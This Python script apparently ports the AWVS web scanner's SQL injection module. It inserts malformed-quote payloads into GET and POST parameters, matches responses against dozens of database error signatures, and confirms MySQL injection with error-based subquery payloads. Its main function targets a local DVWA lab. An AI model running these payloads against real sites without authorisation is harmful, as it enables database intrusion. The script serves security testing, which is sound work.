#!/usr/bin/env python
# coding=utf-8

"""
this script is the python version of the awvs classSQL.inc
date: 2018-04-09
author: jxy
"""
import urlparse
import urllib
import random
import string
import copy
import requests
import json
import re
from lib.common import *

class classSQL(object):
    payload = [
        "1'\"",
        "\\",
        "1\x00\xc0\xa7\xc0\xa2",
        '@@' + 'randStr(5))',
        'JyI=',
        '\xbf\'\xbf"',
        '\xF0\x27\x27\xF0\x22\x22',
    ]
    def __init__(self, url, headers, data=None):
        self.method = 'POST' if data else 'GET'
        self.data = data
        self.headers = headers
        self.url = url
        self.to_check_list = []
        self.aim_error_list = []
        self.confirm_error_list = []
        self.get_value()

    def get_value(self, payload=None):
        # to check if the file upload, if uploaded, return directly
        self.to_check_list = []
        #self.aim_error_list = []
        if payload is None: payload=classSQL.payload
        if self.method == 'GET':
            _ = urlparse.urlparse(self.url)
            if not _.query:
                return
            values = dict(urlparse.parse_qsl(_.query))
            for p in payload:
                for param in values.keys():
                    temp_dict = copy.deepcopy(values)
                    temp_dict[param] =   p
                    temp_query = urllib.urlencode(temp_dict)
                    self.to_check_list.append(urlparse.urlunparse((_.scheme, _.netloc, _.path, _.params, temp_query, _.fragment)))
        elif self.method == 'POST':
            jsondata = False
            try:
                values = dict(urlparse.parse_qsl(self.data))
            except Exception as e:
                print repr(e)
                try:
                    values = json.loads(self.data)
                    jsondata = True
                except:
                    return
            for p in payload:
                for param in values.keys():
                    temp_dict = copy.deepcopy(values)
                    temp_dict[param] =  p
                    if jsondata:
                        self.to_check_list.append(json.dumps(temp_dict))
                    else:
                        temp_query = urllib.urlencode(temp_dict)
                        self.to_check_list.append(temp_query)


        #print "self.to_check_list = {}".format(self.to_check_list)


    def search_errormsg(self, response):
        error_msg_plain = [
                    'Microsoft OLE DB Provider for ODBC Drivers',
                    'Error Executing Database Query',
                    'Microsoft OLE DB Provider for SQL Server',
                    'ODBC Microsoft Access Driver',
                    'ODBC SQL Server Driver',
                    'supplied argument is not a valid MySQL result',
                    'You have an error in your SQL syntax',
                    'Incorrect column name',
                    'Syntax error or access violation:',
                    'Invalid column name',
                    'Must declare the scalar variable',
                    'Unknown system variable',
                    'unrecognized token: ',
                    'undefined alias:',
                    'Can\'t find record in',
                    '2147217900',
                    'Unknown table',
                    'Incorrect column specifier for column',
                    'Column count doesn\'t match value count at row',
                    'Unclosed quotation mark before the character string',
                    'Unclosed quotation mark',
                    'Call to a member function row_array() on a non-object in',
                    'Invalid SQL:',
                    'ERROR: parser: parse error at or near',
                    '): encountered SQLException [',
                    'Unexpected end of command in statement [',
                    '[ODBC Informix driver][Informix]',
                    '[Microsoft][ODBC Microsoft Access 97 Driver]',
                    'Incorrect syntax near ',
                    '[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near',
                    'SQL command not properly ended',
                    'unexpected end of SQL command',
                    'Supplied argument is not a valid PostgreSQL result',
                    'internal error [IBM][CLI Driver][DB2/6000]',
                    'PostgreSQL query failed',
                    'Supplied argument is not a valid PostgreSQL result',
                    'pg_fetch_row() expects parameter 1 to be resource, boolean given in',
                    'unterminated quoted string at or near',
                    'unterminated quoted identifier at or near',
                    'syntax error at end of input',
                    'Syntax error in string in query expression',
                    'Error: 221 Invalid formula',
                    'java.sql.SQLSyntaxErrorException',
                    'SQLite3::query(): Unable to prepare statement:',
                    '<title>Conversion failed when converting the varchar value \'A\' to data type int.</title>',
                    'SQLSTATE=42603',
                    'org.hibernate.exception.SQLGrammarException:',
                    'org.hibernate.QueryException',
                    'System.Data.SqlClient.SqlException:',
                    'SqlException',
                    'SQLite3::SQLException:',
                    'Syntax error or access violation:',
                    'Unclosed quotation mark after the character string',
                    'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
                    'PDOStatement::execute(): SQLSTATE[42601]: Syntax error:',
                    '<b>SQL error: </b> no such column'
				]

        error_msg_re = [
                    "(Incorrect\ssyntax\snear\s'[^']*')",
                    "(Syntax error: Missing operand after '[^']*' operator)",
                    "Syntax error near\s.*?\sin the full-text search condition\s",
                    'column "\w{5}" does not exist',
                    'near\s[^:]+?:\ssyntax\serror',
                    '(pg_query\(\)[:]*\squery\sfailed:\serror:\s)',
                    "('[^']*'\sis\snull\sor\snot\san\sobject)",
                    "(ORA-\d{4,5}:\s)",
                    "(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)",
                    "(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)",
                    "(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)",
                    "(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)",
                    "(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)",
                    "(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)",
                    "(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')",
                    '(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))',
                    "(Unclosed\squotation\smark\safter\sthe\scharacter\sstring\s'[^']*')",
                    "((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)",
                    "((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\) expects parameter \d+ to be resource, \w+ given in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)",
                    "(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \d)",
                    '(Query\sfailed\:\sERROR\:\scolumn\s"[^"]*"\sdoes\snot\sexist\sLINE\s\d)',
                    '(Query\sfailed\:\sERROR\:\s+unterminated quoted string at or near)',
                    '(The string constant beginning with .*? does not have an ending string delimiter\.)',
                    "(Unknown column '[^']+' in '\w+ clause')"
			]

        found = False
        for msg in error_msg_plain:
            if response.find(msg) > -1:
                found = True
                break
        if not found:
            for msg in error_msg_re:
                if re.findall(msg, response):
                    found = True
                    break

        return found

    def confirm_sqli(self):
        # now only test mysql
        confirm_data = [('"','"'), ("'", "'"), ("')","'("), ('")', '"('), ("", "")]
        a = list(string.ascii_lowercase)
        random.shuffle(a)
        anchor = ''.join(a[:10])

        for d in confirm_data:
            confirm_value1 = d[0] + ' and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and ' + d[1]
            confirm_value2 = d[0] + '(select 1 and row(1,1)>(select count(*),concat(concat(' + anchor + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + d[1]
            # print confirm_value1
            # print confirm_value2
            self.get_value(payload=[confirm_value1, confirm_value2])
            # print "=========== confirm sql error injection============"
            # self.start_test()
            for url in self.to_check_list:
                try:
                    if self.method == 'GET':
                        rsp = requests.get(url, headers=self.headers, timeout=10, verify=False)
                    else:
                        rsp = requests.post(self.url, data=url, headers=self.headers, timeout=10, verify=False)
                    if rsp.status_code != 200:
                        break
                    else:
                        response = rsp.content
                    if anchor in response:
                        self.aim_error_list.append((self.method, self.url, url))
                except Exception as identifier:
                    pass




    def start_test(self):

        for url in self.to_check_list:
            try:
                if self.method == 'GET':
                    rsp = requests.get(url, headers=self.headers, timeout=10, verify=False)
                else:
                    #rsp = requests.post(self.url, data=url, headers=self.headers, proxies={'http': '127.0.0.1:8080'}, timeout=10, verify=False)
                    rsp = requests.post(self.url, data=url, headers=self.headers,  timeout=10, verify=False)
                if rsp.status_code != 200:
                    break  # return error
                else:
                    response = rsp.content

                if self.search_errormsg(response):
                    self.aim_error_list.append((self.method, self.url, url))
                    # to confirm the error like awvs
            except Exception as e:
                # print repr(e)
                #logger.error(repr(e))
                break
        # print self.aim_error_list


def sqli_test(url, headers, data=None):
    """
    :url: the url to detect
    :headers:  header info, type is dict
    :data: if POST request, data is the post data
    :rtype: classSQL().aim_error_list, a list object which contains the error-based request and payload
    """
    a = classSQL(url, headers, data=data)
    a.start_test()
    t = a.aim_error_list
    if a.aim_error_list:
        a.confirm_sqli()
        # if a.aim_error_list:
        #     # print "10 [found SQLi] {}".format(a.aim_error_list)
        # else:
            # print "5 [found SQLi no Confirm] {}".format(t)
    return a.aim_error_list



def main():
    headers= {'Cookie':'security=medium; PHPSESSID=9nccaa48mvidcv6kop6077ijc4',
        "Origin": "http://127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded"}
    sqli_test('http://127.0.0.1/DVWA/vulnerabilities/sqli/', headers, data="id=2&Submit=Submit")
    # a.start_test()
    # if a.aim_error_list:
    #     a.confirm_sqli()

if __name__ == '__main__':
    main()
